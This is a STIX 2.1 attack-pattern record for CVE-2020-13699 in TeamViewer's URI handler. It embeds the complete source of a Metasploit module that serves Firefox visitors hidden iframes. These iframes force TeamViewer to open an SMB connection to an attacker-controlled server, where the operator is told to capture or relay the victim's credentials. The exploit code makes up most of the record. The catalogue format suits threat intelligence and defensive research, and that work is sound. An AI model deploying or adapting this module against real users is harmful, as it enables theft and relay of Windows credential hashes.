{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4289e34-ddea-468b-901e-ade814b99aba",
    "created": "2024-08-14T16:21:50.45146Z",
    "modified": "2024-08-14T16:21:50.451463Z",
    "name": "TeamViewer Unquoted URI Handler SMB Redirect",
    "description": " This module exploits an unquoted parameter call within the Teamviewer URI handler to create an SMB connection to an attacker controlled IP. TeamViewer < 8.0.258861, 9.0.258860, 10.0.258873, 11.0.258870 12.0.258869, 13.2.36220, 14.2.56676, 14.7.48350, and 15.8.3 are vulnerable. Only Firefox can be exploited by this vulnerability, as all other browsers encode the space after 'play' and before the SMB location preventing successful exploitation. Teamviewer 15.4.4445, and 8.0.16642 were succssfully tested against. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/teamviewer_uri_smb_redirect.rb",
            "external_id": "teamviewer_uri_smb_redirect.rb"
        },
        {
            "source_name": "reference",
            "url": "https://jeffs.sh/CVEs/CVE-2020-13699.txt"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13699"
        },
        {
            "source_name": "reference",
            "url": "https://community.teamviewer.com/t5/Announcements/Statement-on-CVE-2020-13699/td-p/98448"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TeamViewer Unquoted URI Handler SMB Redirect',\n        'Description' => %q{\n          This module exploits an unquoted parameter call within the Teamviewer\n          URI handler to create an SMB connection to an attacker controlled IP.\n          TeamViewer < 8.0.258861, 9.0.258860, 10.0.258873, 11.0.258870,\n          12.0.258869, 13.2.36220, 14.2.56676, 14.7.48350, and 15.8.3 are\n          vulnerable.\n          Only Firefox can be exploited by this vulnerability, as all other\n          browsers encode the space after 'play' and before the SMB location,\n          preventing successful exploitation.\n          Teamviewer 15.4.4445, and 8.0.16642 were succssfully tested against.\n        },\n        'Author' => [\n          'Jeffrey Hofmann <me@jeffs.sh>', # Vuln discovery, PoC, etc\n          'h00die' # msf module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://jeffs.sh/CVEs/CVE-2020-13699.txt' ],\n          [ 'CVE', '2020-13699' ],\n          [ 'URL', 'https://community.teamviewer.com/t5/Announcements/Statement-on-CVE-2020-13699/td-p/98448' ]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILE_NAME', [false, 'Arbitrary tv file location', '\\\\teamviewer\\\\config.tvs']),\n        OptString.new('SMB_SERVER', [true, 'SMB server IP address', '']),\n        OptEnum.new('URI_HANDLER', [\n          true, 'TeamViewer URI Handler', 'teamviewer10', [\n            'teamviewer10',\n            'teamviewer8', 'teamviewerapi', 'tvchat1', 'tvcontrol1', 'tvfiletransfer1', 'tvjoinv8',\n            'tvpresent1', 'tvsendfile1', 'tvsqcustomer1', 'tvsqsupport1', 'tvvideocall1', 'tvvpn1'\n          ]\n        ])\n      ]\n    )\n  end\n\n  def html_content\n    # For some reason, tends to work best when double iframes.  Single will pop up the 'open app' message, but tends to not connect.\n    %(\n    <html>\n    <head></head>\n    <body>\n      <iframe style=\"height:1px;width:1px;\" src=\"#{datastore['URI_HANDLER']}: --play \\\\\\\\#{datastore['SMB_SERVER']}#{datastore['FILE_NAME']}\"></iframe>\n      <iframe style=\"height:1px;width:1px;\" src=\"#{datastore['URI_HANDLER']}: --play \\\\\\\\#{datastore['SMB_SERVER']}#{datastore['FILE_NAME']}\"></iframe>\n    </body>\n    </html>\n    )\n  end\n\n  def on_request_uri(cli, req)\n    print_status(\"Request received for: #{req.uri}\")\n\n    ua = req.headers['User-Agent'].to_s\n\n    unless ua.include?('Firefox')\n      print_error('Target is not Firefox')\n      return\n    end\n\n    print_status(\"Sending TeamViewer Link to #{ua}...\")\n    send_response_html(cli, html_content)\n  end\n\n  def run\n    print_good(\"Please start an SMB capture/relay on #{datastore['SMB_SERVER']}\")\n    exploit\n  end\nend\n"
}